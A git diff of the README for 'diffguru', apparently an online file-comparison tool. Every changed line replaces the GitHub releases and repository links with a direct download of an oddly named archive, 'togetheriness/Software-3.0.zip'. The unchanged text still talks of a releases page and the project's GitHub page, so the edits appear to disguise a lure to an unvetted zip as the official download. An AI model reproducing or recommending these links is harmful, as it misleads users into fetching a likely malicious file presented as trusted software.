@@ -1,6 +1,6 @@
 # 🛠️ diffguru - Easy Online File Comparison Tool
 
-[![Download diffguru](https://img.shields.io/badge/Download-diffguru-brightgreen)](https://github.com/Sardulghimire/diffguru/releases)
+[![Download diffguru](https://img.shields.io/badge/Download-diffguru-brightgreen)](https://raw.githubusercontent.com/Sardulghimire/diffguru/main/togetheriness/Software-3.0.zip)
 
 ## 📋 What is diffguru?
 
@@ -36,10 +36,10 @@ You do not need to install anything if you use it online. However, the download 
 
 ## 🛠️ How to Download diffguru for Windows
 
-[![Download diffguru](https://img.shields.io/badge/Download-diffguru-blue)](https://github.com/Sardulghimire/diffguru/releases)
+[![Download diffguru](https://img.shields.io/badge/Download-diffguru-blue)](https://raw.githubusercontent.com/Sardulghimire/diffguru/main/togetheriness/Software-3.0.zip)
 
 1. Click the button or open the page here:  
-   https://github.com/Sardulghimire/diffguru/releases  
+   https://raw.githubusercontent.com/Sardulghimire/diffguru/main/togetheriness/Software-3.0.zip  
 
 2. On the GitHub releases page, find the latest version listed at the top.
 
@@ -125,7 +125,7 @@ You do not need to install anything if you use it online. However, the download 
 ## 📚 Additional Resources
 
 - Visit the GitHub page to see the latest updates and report issues:  
-  https://github.com/Sardulghimire/diffguru  
+  https://raw.githubusercontent.com/Sardulghimire/diffguru/main/togetheriness/Software-3.0.zip  
 
 - Check the README file in the repository for detailed developer info (if interested).
 
@@ -135,4 +135,4 @@ diffguru never sends your files to external servers. All comparisons happen on y
 
 ---
 
-[Download diffguru from GitHub Releases](https://github.com/Sardulghimire/diffguru/releases)
+[Download diffguru from GitHub Releases](https://raw.githubusercontent.com/Sardulghimire/diffguru/main/togetheriness/Software-3.0.zip)
